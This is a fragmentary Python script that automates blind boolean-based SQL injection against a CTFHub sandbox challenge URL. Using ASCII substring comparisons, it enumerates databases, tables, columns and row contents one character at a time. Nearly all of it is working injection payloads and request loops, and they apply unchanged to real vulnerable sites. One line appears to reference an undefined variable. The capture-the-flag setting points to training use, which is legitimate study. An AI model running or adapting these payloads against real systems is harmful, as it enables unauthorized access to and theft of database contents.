...
base_url = "http://challenge-55ed37f3ccead375.sandbox.ctfhub.com:10800/?id=1"  # 以知道数据库注入方式的url
headers = {
...
def get_count_database():
    ...
    :return:
    """
    global success_flag, base_url, headers
    for i in range(20):
        poc = f" and (select count(schema_name) from information_schema.SCHEMATA)={i} --+"
        url = base_url + poc
...
def get_database_length(count):
    ...
    for i in range(0, count):  # i代表第几个数据库
        ...
        while True:
            poc = f" and (select length(schema_name) from information_schema.SCHEMATA limit {i},1)={length} --+"
            url = base_url + poc
            response = requests.get(url, headers=headers).text
    ...
    for k in len_list:
        ...
        for i in range(1, k + 1):  # i代表数据库第几位
            for j in range(32, 129):  # j是字符
                ...
                poc = f" and ascii(substr((select schema_name from information_schema.SCHEMATA limit {data_count},1),{i},1))={j} --+"
                url = base_url + poc
                response = requests.get(url, headers=headers).text
                if success_flag in response:
                    database += chr(j)
...
def get_local_database():
    ...
    length = 1  # length代表数据库长度
    while True:
        poc = f" and (select length(database()))={length} --+"
        url = base_url + poc
        response = requests.get(url, headers=headers).text
        if success_flag not in response:
            length = length + 1
    ...
    for i in range(1, length + 1):
        for j in range(32, 127):
            ...
            poc = f" and ascii(substr((select database()),{i},1))={j} --+"
            url = base_url + poc
            response = requests.get(url, headers=headers).text
            if success_flag in response:
                database += chr(j)
...
def get_count_tables(database):
    ...
    global success_flag, base_url, headers
    for i in range(150):
        poc = f" and (select count(table_name) from information_schema.TABLES where TABLE_SCHEMA='{database}')={i} --+"
        url = base_url + poc
        response = requests.get(url, headers=headers).text
        if success_flag in response:
            return i
...
def get_tables_length(database, count):
    ...
    for i in range(0, count):
        length = 1
        while True:
            poc = f" and (select length(table_name) from information_schema.TABLES where TABLE_SCHEMA='{database}' limit {i},1) = {length} --+"
            url = base_url + poc
            response = requests.get(url, headers=headers).text
            if success_flag not in response:
                length = length + 1
    ...
    for k in len_list:
        ...
        for i in range(1, k + 1):
            for j in range(32, 129):
                ...
                poc = f" and ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA='{database}' limit {table_count},1),{i},1))={j} --+"
                url = base_url + poc
                response = requests.get(url, headers=headers).text
                if success_flag in response:
                    tables += chr(j)
...
def get_count_columns(database, table):
    ...
    global success_flag, base_url, headers
    for i in range(150):
        poc = f" and (select count(column_name) from information_schema.columns where TABLE_SCHEMA='{database}' and table_name='{table}')={i} --+"
        url = base_url + poc
        response = requests.get(url, headers=headers).text
        if success_flag in response:
            return i
...
def get_columns_length(database, table, count):
    ...
    for i in range(0, count):
        length = 1
        while True:
            poc = f" and (select length(column_name) from information_schema.columns where TABLE_SCHEMA='{database}' and table_name='{table}' limit {i},1) = {length} --+"
            url = base_url + poc
            response = requests.get(url, headers=headers).text
            if success_flag not in response:
                length = length + 1
    ...
    for k in len_list:
        ...
        for i in range(1, k + 1):
            for j in range(32, 129):
                ...
                poc = f" and ascii(substr((select column_name from information_schema.columns where TABLE_SCHEMA='{database}' and table_name='{table}' limit {column_count},1),{i},1))={j} --+"
                url = base_url + poc
                response = requests.get(url, headers=headers).text
                if success_flag in response:
                    tables += chr(j)
...
def get_count_line(database, table, name):
    ...
    global success_flag, base_url, headers
    for i in range(20):
        poc = f" and (select count({name}) from {database}.{table})={i} --+"
        url = base_url + poc
        response = requests.get(url, headers=headers).text
        if success_flag in response:
            return i
...
def get_line_length(database, table, name, count):
    ...
    for i in range(0, count):  # i代表第几个数据库
        ...
        while True:
            poc = f" and (select length({name}) from {database}.{table} limit {i},1)={length} --+"
            url = base_url + poc
            response = requests.get(url, headers=headers).text
            if success_flag not in response:
                length = length + 1
    ...
    for k in len_list:
        ...
        for i in range(1, k + 1):  # i代表数据库第几位
            for j in range(32, 129):  # j是字符
                if j == 128:
                    print('get_line()出错')
                poc = f" and ascii(substr((select {names} from {database}.{table} limit {line_count},1) ,{i},1))={j} --+"
                url = base_url + poc
                response = requests.get(url, headers=headers).text
                if success_flag in response:
                    line += chr(j)
